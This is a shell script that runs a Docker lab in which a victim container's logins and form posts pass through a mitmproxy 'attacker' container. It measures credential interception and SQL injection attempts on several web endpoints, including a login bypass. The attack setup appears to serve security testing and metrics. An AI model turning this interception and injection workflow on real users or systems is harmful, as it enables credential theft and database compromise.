#!/bin/sh
set -e

# Resolve repository paths.
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
RELEASE_DIR="$REPO_ROOT/artifacts/release"

# The RUN_DEMO_LOGGING flag prevents infinite recursion.
# First run: create a clean logs.txt and re-run this script with output captured.
# Second run: execute the actual demo logic below.
if [ -z "$RUN_DEMO_LOGGING" ]; then
  mkdir -p "$RELEASE_DIR"
  rm -f "$RELEASE_DIR/logs.txt"

  RUN_DEMO_LOGGING=1 sh "$0" "$@" > "$RELEASE_DIR/logs.txt" 2>&1
  exit $?
fi

section() {
  echo ""
  echo "============================================================"
  echo "$1"
  echo "============================================================"
}

step() {
  echo ""
  echo "-- $1"
}

# Clean directory of old artifacts.
mkdir -p "$RELEASE_DIR"
rm -f "$RELEASE_DIR/flows.jsonl" \
      "$RELEASE_DIR/security_events.jsonl" \
      "$RELEASE_DIR/security_metrics.json" \
      "$RELEASE_DIR/summary.json" \
      "$RELEASE_DIR/attacker.log" \
      "$RELEASE_DIR/web.log"

section "Startup: build and start Docker lab"
docker compose up --build -d
echo "Containers started"

section "Startup: wait for MySQL and webapp"

until docker compose exec -T db sh -c "mysqladmin ping -h 127.0.0.1 -uroot -p\"\$(cat /run/secrets/MYSQL_ROOT_PASSWORD)\" --silent"; do
  echo "waiting for mysql..."
  sleep 2
done

echo "MySQL is ready"

sleep 3

docker compose restart web

sleep 5

until docker compose exec -T victim sh -c "curl -s --max-time 5 -x http://attacker:8080 http://web:5000/login > /dev/null"; do
  echo "waiting for webapp..."
  sleep 2
done

echo "webapp is ready"

step "Container status"
docker compose ps

section "Sanity check: victim reaches webapp through mitmproxy"
docker compose exec -T victim sh -c "curl -s -o /dev/null -w 'proxy_path_status=%{http_code}\n' --max-time 10 -x http://attacker:8080 http://web:5000/login"

section "Metric 1: credential interception rate"

LOGIN_CASES="
jdoe1 dock@123A
asmith2 wave!456B
bwilliams1 route@789C
sscott19 ship%753S
"

echo "$LOGIN_CASES" | while read username password; do
  [ -z "$username" ] && continue

  step "login attempt: $username"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 \
    -c /tmp/login_${username}.txt -b /tmp/login_${username}.txt \
    -X POST http://web:5000/login \
    -d 'username=$username' \
    -d 'password=$password'"

done

section "Optional test: /login SQLi authentication bypass"

# This loop sends two login-bypass test requests. addon.py rotates through
# the configured /login payloads, so two attempts test two payloads.
for i in 1 2; do
  step "login bypass attempt $i"

  docker compose exec -T victim sh -c "curl -s -i --max-time 10 -x http://attacker:8080 \
    -c /tmp/login_bypass_${i}.txt -b /tmp/login_bypass_${i}.txt \
    -H 'X-SQLI-Test: login' \
    -X POST http://web:5000/login \
    -d 'username=normal_user' \
    -d 'password=normal_password'"

done

section "Login for authenticated endpoint tests"

docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://web:5000/login \
  -d 'username=bwong3' \
  -d 'password=atlas#789C'"

section "Metric 2: /update_company SQLi attempts"

for i in 1 2; do
  step "update_company attempt $i"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 \
    -c /tmp/cookies.txt -b /tmp/cookies.txt \
    -X POST http://web:5000/update_company \
    -d 'new_company=Shokas Industries Transport'"

done

section "Metric 3: /find_company_drivers SQLi attempts"

for i in 1 2 3 4; do
  step "find_company_drivers attempt $i"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 \
    -c /tmp/cookies.txt -b /tmp/cookies.txt \
    http://web:5000/find_company_drivers/Oceanic%20Freight"

done

section "Metric 4: /search SQLi attempts"

for i in 1 2; do
  step "search attempt $i"

  docker compose exec -T victim sh -c "curl -s --max-time 10 -x http://attacker:8080 \
    -c /tmp/cookies.txt -b /tmp/cookies.txt \
    -X POST http://web:5000/search \
    -d 'firstName=John' \
    -d 'lastName=Doe'"

done

# Give mitmproxy a moment to flush logs.
sleep 2

section "Generate security metrics"
python3 "$REPO_ROOT/scripts/summarize_security_metrics.py"

# Previous project version flow summary.
if [ -f "$REPO_ROOT/scripts/export_summary.py" ]; then
  section "Generate flow summary"
  python3 "$REPO_ROOT/scripts/export_summary.py"
fi

section "Saving container logs"
docker compose logs attacker > "$RELEASE_DIR/attacker.log" 2>&1 || true
docker compose logs web > "$RELEASE_DIR/web.log" 2>&1 || docker compose logs web_server > "$RELEASE_DIR/web.log" 2>&1 || true

echo "Saved attacker logs to artifacts/release/attacker.log"
echo "Saved web logs to artifacts/release/web.log"

section "Final artifacts"
echo "Artifacts written to $RELEASE_DIR"
ls -l "$RELEASE_DIR"

section "Security metrics"
cat "$RELEASE_DIR/security_metrics.json"